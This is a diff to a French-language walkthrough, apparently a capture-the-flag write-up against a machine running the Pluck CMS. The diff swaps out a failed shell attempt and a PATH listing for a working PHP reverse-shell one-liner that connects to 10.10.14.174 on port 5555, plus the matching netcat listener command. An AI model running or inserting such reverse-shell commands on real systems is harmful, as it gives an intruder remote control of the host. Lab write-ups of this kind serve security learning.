@@ -284,14 +284,11 @@ ps -p $$ -o comm=
 sh
 ```
 
-Puisque pluck est un CMS codé en php, on tente de créer un shell avec php:
+Puisque pluck est un CMS codé en php, on tente de créer un deuxième reverse shell avec php pour échapper le premier:
 ```php
-php -r 'system("/bin/bash");'
+php -r '$sock=fsockopen("10.10.14.174",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
-Mais sans succès. À ce stade, on décide de regarder quelles commandes sont disponibles:
+Il ne faut pas oublier de démarrer netcat sur notre machine:
 ```bash
-echo $PATH
-/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-
-for dir in $(echo $PATH | tr ":" "\n"); do echo "$dir:"; ls -1 $dir; echo ""; done
+nc -lvnp 5555
 ```
